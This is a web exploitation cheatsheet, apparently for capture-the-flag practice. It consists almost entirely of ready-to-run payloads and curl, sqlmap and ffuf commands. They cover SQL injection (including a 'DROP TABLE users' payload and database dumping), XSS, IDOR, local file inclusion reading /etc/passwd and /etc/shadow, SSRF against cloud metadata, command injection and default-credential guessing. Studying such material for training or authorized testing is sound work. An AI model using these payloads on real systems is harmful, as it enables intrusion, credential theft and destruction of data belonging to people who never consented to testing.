# Web Exploitation Cheatsheet

## Quick Start

    curl -s "URL" | grep -i "flag\|admin\|api"
    curl -s "URL/robots.txt"
    ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac
    curl -s "URL?id=1'"

## 1. SQL Injection

### Manual Testing

    curl -s "URL?id=1'"
    curl -s "URL?id=1'--"
    curl -s "URL?id=1' ORDER BY 1--"
    curl -s "URL?id=1' ORDER BY 2--"
    curl -s "URL?id=1' ORDER BY 3--"

### UNION SELECT

    curl -s "URL?id=-1' UNION SELECT 1,2,3--"
    curl -s "URL?id=-1' UNION SELECT 1,version(),3--"
    curl -s "URL?id=-1' UNION SELECT 1,database(),3--"

### SQLMap (Automated)

    sqlmap -u "URL?id=1" --batch
    sqlmap -u "URL?id=1" --batch --dbs
    sqlmap -u "URL?id=1" -D dbname --tables
    sqlmap -u "URL?id=1" -D dbname -T users --dump
    sqlmap -r request.txt --batch

### Common Payloads

    ' OR '1'='1
    ' OR 1=1--
    ' UNION SELECT NULL--
    ' UNION SELECT 1,2,3--
    ' AND SLEEP(5)--
    '; DROP TABLE users--

## 2. Cross-Site Scripting (XSS)

### Test Payloads

    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    "><script>alert(1)</script>
    <iframe src="javascript:alert(1)">
    <body onload=alert(1)>

### Test Command

    curl -s "URL?q=<script>alert(1)</script>" | grep -i "script"

### Where to Test
- Search boxes
- URL parameters reflected in page
- Profile fields
- Comment sections
- Error messages

## 3. IDOR (Insecure Direct Object Reference)

### Test Pattern

    curl -s "URL/api/user/1002" -H "Cookie: session=YOUR_SESSION"
    curl -s "URL/api/user/1003" -H "Cookie: session=YOUR_SESSION"

### What to Look For
- Different user's data returned
- 200 OK instead of 403
- PII in response
- Admin functions accessible

## 4. Local File Inclusion (LFI)

### Test Payloads

    curl -s "URL?page=../../../../etc/passwd"
    curl -s "URL?page=php://filter/convert.base64-encode/resource=index.php"
    curl -s "URL?page=../../../../etc/passwd%00"
    curl -s "URL?page=%252e%252e%252f%252e%252e%252fetc/passwd"

### Common Files to Read

    /etc/passwd
    /etc/shadow
    /var/www/html/config.php
    /proc/self/environ
    /proc/self/cmdline

## 5. Server-Side Request Forgery (SSRF)

### Test Payloads

    curl -s "URL?url=http://169.254.169.254/latest/meta-data/"
    curl -s "URL?url=http://127.0.0.1:80/admin"
    curl -s "URL?url=http://localhost:8080/"
    curl -s "URL?url=http://192.168.1.1/"

### Common Parameters

    ?url=
    ?redirect=
    ?next=
    ?target=
    ?fetch=
    ?file=
    ?page=
    ?path=
    ?dest=
    ?destination=

## 6. Authentication Bypass

### JWT Tampering

    echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxx" | cut -d. -f2 | base64 -d

### Default Credentials

    admin:admin
    admin:password
    admin:admin123
    root:root
    test:test
    guest:guest

## 7. Directory Fuzzing

    ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac
    ffuf -u URL/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak -ac
    ffuf -u URL/FUZZ -w wordlist.txt -fs 0 -ac

### Common Paths

    /admin
    /api
    /backup
    /.git
    /.env
    /config
    /robots.txt
    /sitemap.xml

## 8. Command Injection

    ; id
    | id
    && id
    $(id)
    `id`

URL encoded:
    %3B+id
    %7C+id

## Critical Tips

1. Always check source code first (Ctrl+U)
2. Check robots.txt and sitemap.xml
3. Test every parameter with a single quote
4. Look for API endpoints in JavaScript files
5. Try default credentials on every login form
6. If over 15 min, move on
